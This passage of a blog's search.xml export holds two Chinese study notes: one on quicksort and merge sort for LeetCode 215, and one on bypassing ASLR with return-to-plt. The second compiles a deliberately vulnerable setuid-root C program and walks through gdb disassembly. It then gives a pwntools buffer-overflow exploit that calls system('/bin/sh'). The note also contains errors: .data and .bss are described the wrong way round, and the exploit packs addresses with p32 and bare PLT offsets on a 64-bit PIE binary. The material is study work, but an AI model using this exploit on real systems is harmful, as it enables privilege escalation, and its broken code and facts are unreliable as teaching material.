        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>排序算法总结</title>
    <url>/2024/03/19/leetcode-sort/</url>
    <content><![CDATA[<h1><span id="排序算法总结">排序算法总结</span></h1><p>总结一把最可能面试面到的排序：**快速排序 **和 <strong>归并排序</strong></p>
<h2><span id="快速排序">快速排序</span></h2><p><strong>核心思路</strong></p>
<ul>
<li>快速排序的思路是每次确定一个值，该值的左边都是比它小的，右边都是比它大的</li>
</ul>
<h3><span id="215-数组中的第k个最大元素"></span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKthLargest</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment">## 快速排序的思路是每次确定一个值，该值的左边都是比它小的，右边都是比它大的</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            nums[high], nums[mid] = nums[mid], nums[high]</span><br><span class="line">            </span><br><span class="line">            i = low</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(low, high):</span><br><span class="line">                <span class="keyword">if</span> nums[j] &lt;= nums[high]:</span><br><span class="line">                    nums[i], nums[j] = nums[j], nums[i]</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">            nums[i], nums[high] = nums[high], nums[i]</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">quickSort</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            <span class="keyword">if</span> low &gt;= high:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            pi = partition(nums, low, high)</span><br><span class="line">            quickSort(nums, low, pi-<span class="number">1</span>)</span><br><span class="line">            quickSort(nums, pi+<span class="number">1</span>, high)</span><br><span class="line">        </span><br><span class="line">        quickSort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums[-k]</span><br></pre></td></tr></table></figure>



<h2><span id="归并排序">归并排序</span></h2><p><strong>核心思路</strong></p>
<ul>
<li>分成左右两个<strong>有序数组</strong>，然后要将两个数组按顺序合并好（双指针合并）</li>
<li>涉及到数组边界不清晰的时候，<strong>最好用while循环遍历数组</strong>而不用nums[low:high]的形式</li>
</ul>
<h3><span id="215-数组中的第k个最大元素"></span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKthLargest</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment">## 归并排序的思路是，分成左右两个有序数组，然后要将两个数组按顺序合并好</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">nums, low, mid, high</span>): <span class="comment"># 职能是将两个有序数组按顺序合并好——双指针</span></span><br><span class="line">            i, j = low, mid+<span class="number">1</span></span><br><span class="line">            res = []</span><br><span class="line">            <span class="keyword">while</span> i &lt;= mid <span class="keyword">and</span> j &lt;= high:</span><br><span class="line">                <span class="keyword">if</span> nums[i] &lt; nums[j]: </span><br><span class="line">                    res.append(nums[i])</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    res.append(nums[j])</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &lt;= mid:</span><br><span class="line">                res.append(nums[i])</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> j &lt;= high:</span><br><span class="line">                res.append(nums[j])</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            nums[low:high+<span class="number">1</span>] = res[:]</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">sort</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            <span class="keyword">if</span> low &gt;= high:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            sort(nums, low, mid)</span><br><span class="line">            sort(nums, mid+<span class="number">1</span>, high)</span><br><span class="line">            merge(nums, low, mid, high)</span><br><span class="line">        </span><br><span class="line">        sort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums[-k]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制学习笔记1-ASLR绕过</title>
    <url>/2024/03/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-ASLR%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1><span id="二进制保护机制原理和绕过技巧">二进制保护机制原理和绕过技巧</span></h1><p>[toc]</p>
<h2><span id="0x00-工具">0x00 工具</span></h2><ul>
<li><strong>peda</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>readelf</strong></li>
</ul>
<p>readelf的作用是<strong>用来查看当前elf文件的符号表</strong>，符号表中的信息只包括全局变量和函数名。 动态符号表(.synsym)用来保存与动态链接相关的导入导出符号，不包括模块内的符号；而systab表则保存所有的符号，包括.dynsym中的符号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system</span><br></pre></td></tr></table></figure>



<h2><span id="0x01-aslr">0x01 ASLR</span></h2><p>ASLR（地址空间布局随机化）的原理不作详细介绍，它可以将进程内的某些内存地址进行随机化来加大入侵难度。因此我们很难直接通过ret2libc成功利用漏洞。</p>
<h3><span id="1-绕过aslr核心点">1. 绕过ASLR核心点</span></h3><ul>
<li>开启ASLR后，libc的<strong>基地址会变</strong>，但是<strong>函数的偏移量不会变</strong></li>
<li>system 函数地址 &#x3D; libc基地址 + 函数偏移量</li>
</ul>
<p><img src="C:\Users\Ryan\AppData\Roaming\Typora\typora-user-images\image-20240321222858287.png" alt="image-20240321222858287"></p>
<p><img src="C:\Users\Ryan\AppData\Roaming\Typora\typora-user-images\image-20240321222637434.png" alt="image-20240321222637434"></p>
<h3><span id="2-return-to-plt技术">2. return-to-plt技术</span></h3><h4><span id="21-背景知识">2.1 背景知识</span></h4><p>在介绍这一技术前，先了解一下Linux内存布局、静态函数库和动态函数库（共享函数库）的区别以及PIC。</p>
<h5><span id="211-linux内存布局">2.1.1 Linux内存布局</span></h5><p><img src="C:\Users\Ryan\AppData\Roaming\Typora\typora-user-images\image-20240321224452523.png" alt="image-20240321224452523"></p>
<ul>
<li>.text 汇编代码</li>
<li>.data 无初始值的数据（静态变量，全局变量）</li>
<li>.bss 有初始值的数据 （静态变量，全局变量）</li>
<li>heap 堆</li>
<li>shared object 共享对象区域（动态库所在）</li>
<li>stack 栈</li>
<li>kernel-area 内核区域</li>
</ul>
<h5><span id="212-静态函数库与动态函数库">2.1.2 静态函数库与动态函数库</span></h5><p>静态函数库 —— 在程序运行前就已经被加载到目标程序里了</p>
<p>动态函数库 —— 在程序启动的时候被加载</p>
<p>不同于静态库的是，<strong>共享库的text段在多个进程间共享</strong>，<strong>但它的数据段在每个进程中是唯一的</strong>。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC! [4] </p>
<p><font color="red"><strong>这句话非常重要！</strong></font></p>
<h5><span id="213-pic位置独立代码">2.1.3 PIC（位置独立代码）</span></h5><p>位置无关代码是指代码无论被加载到哪个地址上都可以正常执行。gcc选项中添加-fPIC会产生相关代码。</p>
<p>共享库的text段会指向数据段中的一个特定表，这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。</p>
<p><strong>简言之，既然我们想让共享函数库被多个进程共享，就要让它的.text段中的数据描述符和函数地址能被重定位。可是由于.text无法被写，我们只能通过PIC来间接寻址完成！</strong></p>
<h4><span id="22-got全局偏移表amp-plt过程链接表">2.2 GOT（全局偏移表）&amp; PLT（过程链接表）</span></h4><h5><span id="221-got">2.2.1 GOT</span></h5><p>全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符。</p>
<h5><span id="221-plt">2.2.1 PLT</span></h5><p>过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。<strong>存根代码在动态链接器的帮助下，解析函数地址</strong>并将其拷贝到GOT(GOT[n])中。**解析过程只发生在第一次调用函数(‘function’)的时候，之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)**。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址。</p>
<p>简言之：</p>
<ul>
<li>第一次调用function时，动态链接器会解析function的地址，并拷贝到GOT(GOT(n))中</li>
<li>以后再次调用function时，只会调用存根代码(function@PLT)，而不会再次解析function的地址</li>
<li>存根代码会从GOT(GOT[n])里获取地址并跳转</li>
</ul>
<p><strong>两层间接寻址：function@PLT -&gt; GOT(GOT(n)) -&gt; function addr</strong></p>
<h2><span id="0x02-漏洞利用">0x02 漏洞利用</span></h2><h3><span id="1-漏洞代码">1. 漏洞代码</span></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;      <span class="comment">//这个函数在啊程序中并没有直接执行，但是为了后续的寻找plt进行漏洞利用，需要编译它</span></span><br><span class="line"></span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"> <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3><span id="2-编译">2. 编译</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">gcc -g -fno-stack-protector -o vuln vuln.c</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chown</span> root vuln</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chgrp</span> root vuln</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chmod</span> +s vuln</span></span><br></pre></td></tr></table></figure>



<h3><span id="3-调试">3. 调试</span></h3><p>查看main函数的汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disassemble main</span></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x000000000000118b &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x000000000000118c &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x000000000000118f &lt;+4&gt;:     sub    rsp,0x120</span><br><span class="line">   0x0000000000001196 &lt;+11&gt;:    mov    DWORD PTR [rbp-0x114],edi</span><br><span class="line">   0x000000000000119c &lt;+17&gt;:    mov    QWORD PTR [rbp-0x120],rsi</span><br><span class="line">   0x00000000000011a3 &lt;+24&gt;:    mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">   0x00000000000011aa &lt;+31&gt;:    mov    rax,QWORD PTR [rbp-0x120]</span><br><span class="line">   0x00000000000011b1 &lt;+38&gt;:    add    rax,0x8</span><br><span class="line">   0x00000000000011b5 &lt;+42&gt;:    mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x00000000000011b8 &lt;+45&gt;:    lea    rax,[rbp-0x110]</span><br><span class="line">   0x00000000000011bf &lt;+52&gt;:    mov    rsi,rdx</span><br><span class="line">   0x00000000000011c2 &lt;+55&gt;:    mov    rdi,rax</span><br><span class="line">   0x00000000000011c5 &lt;+58&gt;:    call   0x1030 &lt;strcpy@plt&gt;</span><br><span class="line">   0x00000000000011ca &lt;+63&gt;:    lea    rax,[rbp-0x110]</span><br><span class="line">   0x00000000000011d1 &lt;+70&gt;:    mov    rdi,rax</span><br><span class="line">   0x00000000000011d4 &lt;+73&gt;:    call   0x1040 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011d9 &lt;+78&gt;:    mov    eax,0x0</span><br><span class="line">   0x00000000000011de &lt;+83&gt;:    leave  </span><br><span class="line">   0x00000000000011df &lt;+84&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>查看shell函数的汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disassemble shell</span></span><br><span class="line">Dump of assembler code for function shell:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x000000000000116a &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x000000000000116d &lt;+4&gt;:     lea    rax,[rip+0xe90]        # 0x2004</span><br><span class="line">   0x0000000000001174 &lt;+11&gt;:    mov    rdi,rax</span><br><span class="line">   0x0000000000001177 &lt;+14&gt;:    mov    eax,0x0</span><br><span class="line">   0x000000000000117c &lt;+19&gt;:    call   0x1050 &lt;system@plt&gt;</span><br><span class="line">   0x0000000000001181 &lt;+24&gt;:    mov    edi,0x0</span><br><span class="line">   0x0000000000001186 &lt;+29&gt;:    call   0x1060 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>找到’&#x2F;bin&#x2F;sh’的地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">find <span class="string">&#x27;/bin/sh&#x27;</span></span></span><br><span class="line">Searching for &#x27;/bin/sh&#x27; in: None ranges</span><br><span class="line">Found 3 results, display max 3 items:</span><br><span class="line">     vuln : 0x564f073e3004 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br><span class="line">     vuln : 0x564f073e4004 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br><span class="line">libc.so.6 : 0x7fe9a4c99117 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure>



<h3><span id="4-exp">4. EXP</span></h3><p>exp的构造，首先向缓冲区中填充256个字节的‘A’+向对齐空间中填充16字节的‘A’+ system@PLT的地址+exit@PLT的地址+system_arg的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">system = <span class="number">0x1050</span></span><br><span class="line">exit = <span class="number">0x1060</span></span><br><span class="line">system_arg = <span class="number">0x559e0dd67004</span></span><br><span class="line">payload=<span class="string">&quot;A&quot;</span> * <span class="number">272</span>+p32(system)+p32(exit)+p32(system_arg)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">io= process(argv=[<span class="string">&#x27;./vuln&#x27;</span>, payload])</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2><span id="参考">参考</span></h2><p>[1] <a href="https://gxkyrftx.github.io/2019/03/02/%E7%BB%95%E8%BF%87ASLR-%E4%B8%80/">绕过ASLR-一</a></p>
<p>[2] <a href="https://lantern.cool/note-pwn-linux-protect/index.html">Linux常用保护机制</a></p>
<p>[3] <a href="https://darkwing.moe/2019/02/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/">Pwn学习笔记2-内存布局</a></p>
<p>[4] <a href="https://diting0x.github.io/20170101/bypassaslr-returntoplt/">bypassaslr-returntoplt</a></p>
]]></content>
      <categories>
        <category>二进制学习笔记</category>
      </categories>
      <tags>
        <tag>二进制学习笔记</tag>
      </tags>
  </entry>
</search>
